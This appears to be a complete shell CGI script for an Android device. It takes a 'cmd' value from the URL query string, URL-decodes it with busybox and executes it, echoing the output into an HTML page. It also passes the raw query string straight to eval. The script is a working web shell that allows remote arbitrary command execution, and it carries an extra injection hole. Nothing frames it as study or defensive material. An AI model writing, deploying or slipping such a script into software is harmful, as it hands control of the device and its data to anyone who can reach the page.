#!/system/bin/sh
echo "Content-type: text/html"
echo ""

eval $(echo "$QUERY_STRING"|awk -F'&' '{for(i=1;i<=NF;i++){print $i}}')
tmp=`/system/bin/busybox httpd -d $cmd`
echo "<h1>$tmp</h1>"
echo "<pre>"
$tmp
echo "</pre>"
